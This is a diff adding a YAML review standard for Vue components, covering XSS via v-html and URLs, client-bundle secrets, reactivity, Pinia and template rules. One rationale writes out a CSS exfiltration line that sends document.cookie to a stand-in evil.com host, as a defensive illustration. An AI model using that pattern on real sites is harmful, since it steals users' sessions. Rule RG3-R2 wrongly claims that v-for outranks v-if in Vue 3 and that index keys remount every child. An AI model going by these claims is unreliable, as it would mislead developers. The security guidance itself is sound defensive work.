@@ -1,0 +1,234 @@
+id: STD-REVIEW-VUE
+type: std_area
+zone: operational
+title: "Review — Vue"
+status: approved
+owner: harness
+version: 1.0.0
+description: |
+  Vue review rules (scope **/*.vue). Block-worthy XSS rules around v-html,
+  URL injection, and client-bundle secrets, plus advisory patterns for
+  composables, reactivity discipline, Pinia, and testing with Vitest.
+rule_groups:
+  - id: STD-REVIEW-VUE-RG1
+    title: "Safety — v-html, URL injection, client secrets, template trust"
+    status: approved
+    owner: harness
+    rules:
+      - id: STD-REVIEW-VUE-RG1-R1
+        title: "Never v-html on user content; sanitize or sandbox if unavoidable"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: critical
+        relates_to_std: [STD-REVIEW-COMMON-RG1-R2]
+        detector: null
+        description: |
+          ALWAYS: let Vue's text interpolation ({{ }}) and attribute
+          binding (:title) auto-escape — they are safe by default. When
+          raw HTML rendering is unavoidable, sanitize with DOMPurify
+          (allowlist config) before binding to v-html, or render in a
+          sandboxed iframe. Vue recommends sanitizing on the backend
+          before persisting.
+          NEVER: bind user-controlled content directly to v-html — it
+          bypasses all Vue escaping and is a direct XSS vector. The same
+          applies to render functions: passing user HTML through h() with
+          innerHTML is v-html by another name. Never use user-controlled
+          content as a component template — no runtime template
+          compilation from user input. Never bind a user-controlled string
+          to :is to resolve an arbitrary component.
+        rationale: |
+          Vue's template compiler auto-escapes text interpolation and
+          attribute bindings. v-html is the explicit opt-out — it injects
+          raw HTML directly into the DOM with zero sanitization. DOMPurify
+          with an allowlist config is the standard defense, but the
+          safest fix is to avoid v-html entirely: render as text or
+          structured data instead of raw markup.
+      - id: STD-REVIEW-VUE-RG1-R2
+        title: "Validate URL schemes in :href/:src; never trust user URLs"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: critical
+        relates_to_std: [STD-REVIEW-COMMON-RG1-R2]
+        detector: null
+        description: |
+          ALWAYS: validate the scheme of any user-supplied URL before
+          binding to :href or :src. Allow http:, https:, and mailto:
+          only. Reject javascript: and data: — they execute arbitrary
+          code. Sanitize on the backend before persisting.
+          NEVER: bind a user-controlled string directly to :href or :src
+          without scheme validation — Vue does not escape these attributes.
+          NEVER: bind user input to :style with a raw string — CSS can
+          exfiltrate data via attribute selectors and url() references.
+          Use object syntax with whitelisted properties. Never bind user
+          input to onclick, onfocus, or any event attribute.
+        rationale: |
+          Vue escapes text and most attribute bindings, but :href and
+          :src are passed through to the DOM as-is. A javascript: URL in
+          an anchor executes in the page context. :style with raw user
+          strings is a CSS injection vector — an attacker sets background:
+          url("https://evil.com/steal?data=" + document.cookie) and
+          exfiltrates sensitive data when the element renders.
+      - id: STD-REVIEW-VUE-RG1-R3
+        title: "Never bundle secrets via VITE_* env vars into the client"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: critical
+        relates_to_std: [STD-REVIEW-COMMON-RG1-R2]
+        detector: null
+        description: |
+          ALWAYS: treat import.meta.env.VITE_* values as public — they are
+          inlined into the client bundle at build time and visible in the
+          browser. Secrets stay in server-only env vars or backend services.
+          Use httpOnly cookies for session tokens.
+          NEVER: reference a secret through a VITE_* env var — it ships
+          to every browser. import.meta.env.VITE_API_SECRET in a .vue
+          file is a published secret.
+        rationale: |
+          Vite's define plugin replaces import.meta.env.VITE_* with the
+          literal string value at build time — the secret is in the .js
+          bundle served to the browser. There is no runtime check or
+          warning. The VITE_ prefix convention is the only boundary
+          between server and client config; misusing it is irreversible
+          without a key rotation.
+  - id: STD-REVIEW-VUE-RG2
+    title: "Reactivity and patterns — composables, Pinia, provide/inject, vue-query"
+    status: approved
+    owner: harness
+    rules:
+      - id: STD-REVIEW-VUE-RG2-R1
+        title: "ref is primary; never destructure reactive or Pinia store without toRefs"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: info
+        relates_to_std: []
+        detector: null
+        description: |
+          ALWAYS: use ref() as the primary state API. Use reactive() only
+          for grouped object state and never reassign the whole reactive
+          object. Access ref values via .value in script — they are
+          auto-unwrapped only at the template top level (not inside
+          arrays, Map, or Set).
+          NEVER: destructure a reactive() object or a Pinia store without
+          wrapping in toRefs() / storeToRefs(). A plain destructure
+          (const { count } = store) extracts the value at that instant
+          and drops all reactivity — count is now a static number that
+          never updates. Never reassign a reactive() variable — it breaks
+          the proxy link.
+        rationale: |
+          reactive() wraps the object in a Proxy. Destructuring extracts
+          raw values from the proxy at call time — they are plain
+          primitives with no reactive connection. toRefs() converts each
+          property into an individual ref that stays linked to the source
+          object. Pinia's storeToRefs() does the same for Pinia stores.
+      - id: STD-REVIEW-VUE-RG2-R2
+        title: "Composable discipline — toValue inputs, toRefs outputs, setup-only call"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: info
+        relates_to_std: [STD-REVIEW-VUE-RG2-R1]
+        detector: null
+        description: |
+          ALWAYS: accept MaybeRefOrGetter<T> inputs in composables and
+          normalize with toValue() so callers can pass a ref, a getter,
+          or a raw value. Return toRefs(reactive(...)) so consumers can
+          destructure without losing reactivity.
+          NEVER: call a composable that uses lifecycle hooks, provide, or
+          inject outside a component setup() — it will throw or silently
+          fail. A composable cannot be called lazily inside a callback,
+          conditionally inside an if block, or in an async context after
+          an await.
+        rationale: |
+          toValue() is the single normalization point — it unwraps refs,
+          calls getters, and passes raw values through. Without it, the
+          composable forces every caller to use the same form.
+          Lifecycle hooks and provide/inject rely on Vue's internal
+          component instance, which only exists during synchronous setup
+          execution. A lazy or conditional call has no instance to attach to.
+      - id: STD-REVIEW-VUE-RG2-R3
+        title: "Pinia setup stores; never persist auth tokens to localStorage"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: info
+        relates_to_std: [STD-REVIEW-VUE-RG1-R3]
+        detector: null
+        description: |
+          ALWAYS: use Pinia setup stores (ref for state, computed for
+          getters, function for actions). Use storeToRefs() for state and
+          getters; destructure actions directly. Put server-cache state
+          in @tanstack/vue-query, not Pinia — Pinia owns client state only.
+          NEVER: persist raw auth tokens to localStorage via a Pinia
+          plugin or manual setItem. localStorage is accessible to any XSS.
+          Use httpOnly cookies for session tokens.
+          NEVER: pass .value into a vue-query query key — the key must
+          be the ref or computed itself, because passing .value freezes
+          it to a static value and kills reactive refetch.
+        rationale: |
+          Setup stores are plain Composition API — they compose with
+          other composables naturally and do not need a separate options
+          map. Mixing server and client state in Pinia creates two caches
+          that drift apart. The .value-in-query-key bug is a common silent
+          failure: the query runs once with the initial value and never
+          refetches when the source changes.
+  - id: STD-REVIEW-VUE-RG3
+    title: "SFC structure and templates — block order, v-for keys, macros"
+    status: approved
+    owner: harness
+    rules:
+      - id: STD-REVIEW-VUE-RG3-R1
+        title: "SFC block order, Composition API only, one component per file"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: info
+        relates_to_std: []
+        detector: null
+        description: |
+          ALWAYS: use <script setup lang="ts"> with the Composition API
+          for all new code. Order blocks inside .vue: <script setup>,
+          then <template>, then <style scoped>. One component per file
+          with PascalCase naming (AuctionCard.vue). Composables are
+          camelCase prefixed with use (useAuctionTimer).
+          NEVER: use the Options API in new code — data(), methods,
+          computed: {}, and watch: {} are legacy. The Composition API is
+          the standard for Vue 3 and the only API that composes cleanly
+          with composables and TypeScript.
+        rationale: |
+          The Options API splits a concern across multiple option blocks
+          (data in one place, methods elsewhere, watchers in a third).
+          The Composition API groups all logic for a feature in one
+          composable function. TypeScript inference works naturally with
+          ref() and reactive() — no complex type annotations needed for
+          this context.
+      - id: STD-REVIEW-VUE-RG3-R2
+        title: "Stable :key on every v-for; never v-if and v-for on same element"
+        status: approved
+        scope:
+          - "**/*.vue"
+        severity: info
+        relates_to_std: []
+        detector: null
+        description: |
+          ALWAYS: provide a :key on every v-for with a stable unique
+          primitive (database ID, UUID) — never the array index, never
+          an object. Wrap combined v-if + v-for in <template v-for>
+          with an inner v-if, or precompute a filtered list.
+          NEVER: put v-if and v-for on the same element — v-for has
+          higher priority and runs first, so v-if evaluates on every
+          iteration instead of on the list itself. This is both a
+          performance bug (unnecessary iterations) and a correctness bug
+          (the if condition may reference data that is undefined until
+          the list resolves).
+        rationale: |
+          v-for processes before v-if in Vue 3. On the same element,
+          v-for iterates every item and then v-if filters — the iteration
+          happens even for items that will be discarded. Separating them
+          via <template v-for> skips the filtered items at iteration
+          time. Key stability is what lets Vue reuse DOM nodes across
+          list updates — index-based keys cause every child to unmount
+          and remount on insertion or deletion.
